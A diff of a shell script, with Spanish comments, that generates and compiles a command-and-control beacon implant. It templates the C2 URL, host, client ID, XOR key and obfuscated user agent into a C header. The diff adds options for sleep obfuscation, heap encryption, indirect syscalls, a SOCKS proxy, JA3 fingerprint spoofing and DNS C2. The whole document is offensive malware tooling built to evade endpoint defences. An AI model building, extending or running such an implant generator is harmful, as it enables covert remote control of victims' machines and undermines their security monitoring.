@@ -26,6 +26,18 @@ TIMEOUT=15
 MAX_SIZE=2097152
 BEACON="beacon.enc"
 BACKUP="${OUTPUT}.bak"
+# === SLEEP OBFUSCATION + SOCKS + PROFILE (new) ===
+SLEEP_BASE=6000
+MIN_JITTER=30
+MAX_JITTER=60
+SLEEP_OBFUSCATION=""
+SLEEP_ENCRYPT_HEAP="1"
+SLEEP_INDIRECT_SYSCALLS="1"
+SOCKS_ENABLED="0"
+SOCKS_BIND_ADDR="127.0.0.1"
+SOCKS_BIND_PORT="1080"
+TLS_JA3_HASH=""
+DNS_DOMAIN=""
 # === LEER ARGUMENTOS ===
 # Uso: script.sh [TARGET] [URL] [MALEABLE] [CLIENT_ID] ... [OUTPUT]
 # Puedes pasar hasta 14 argumentos (todos los que tienes)
@@ -123,6 +135,50 @@ while [[ $# -gt 0 ]]; do
             OUTPUT="$2"
             shift 2
             ;;
+        --sleep-base)
+            SLEEP_BASE="$2"
+            shift 2
+            ;;
+        --min-jitter)
+            MIN_JITTER="$2"
+            shift 2
+            ;;
+        --max-jitter)
+            MAX_JITTER="$2"
+            shift 2
+            ;;
+        --sleep-obfuscation)
+            SLEEP_OBFUSCATION="$2"
+            shift 2
+            ;;
+        --sleep-encrypt-heap)
+            SLEEP_ENCRYPT_HEAP="$2"
+            shift 2
+            ;;
+        --sleep-indirect)
+            SLEEP_INDIRECT_SYSCALLS="$2"
+            shift 2
+            ;;
+        --socks-enabled)
+            SOCKS_ENABLED="$2"
+            shift 2
+            ;;
+        --socks-addr)
+            SOCKS_BIND_ADDR="$2"
+            shift 2
+            ;;
+        --socks-port)
+            SOCKS_BIND_PORT="$2"
+            shift 2
+            ;;
+        --tls-ja3)
+            TLS_JA3_HASH="$2"
+            shift 2
+            ;;
+        --dns-domain)
+            DNS_DOMAIN="$2"
+            shift 2
+            ;;
         -h|--help)
             show_help
             ;;
@@ -170,6 +226,13 @@ echo "USER_AGENT2: $USER_AGENT2"
 echo "USER_AGENT3: $USER_AGENT3"
 echo "KEY: $XOR_KEY_HEX"
 echo "OUTPUT: $OUTPUT"
+echo "SLEEP_BASE: ${SLEEP_BASE}ms"
+echo "MIN_JITTER: ${MIN_JITTER}%"
+echo "MAX_JITTER: ${MAX_JITTER}%"
+echo "SLEEP_OBFUSCATION: ${SLEEP_OBFUSCATION}"
+echo "SOCKS: enabled=${SOCKS_ENABLED} addr=${SOCKS_BIND_ADDR} port=${SOCKS_BIND_PORT}"
+echo "TLS_JA3: ${TLS_JA3_HASH}"
+echo "DNS_DOMAIN: ${DNS_DOMAIN}"
 
 chmod +x build.sh && ./build.sh
 
@@ -316,9 +379,9 @@ unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };
 #define C2_URL "$URL"
 #define MALEABLE "$MALEABLE"
 #define CLIENT_ID "$CLIENT_ID"
-#define SLEEP_BASE 6000  // ms
-#define MIN_JITTER 30    // 30%
-#define MAX_JITTER 60    // 60%
+#define SLEEP_BASE $SLEEP_BASE  // ms
+#define MIN_JITTER $MIN_JITTER    // $MIN_JITTER%
+#define MAX_JITTER $MAX_JITTER    // $MAX_JITTER%
 #define MAX_RETRIES 3
 #define C2_HOST "$C2_HOST"
 #define LC2_HOST L"$C2_HOST"
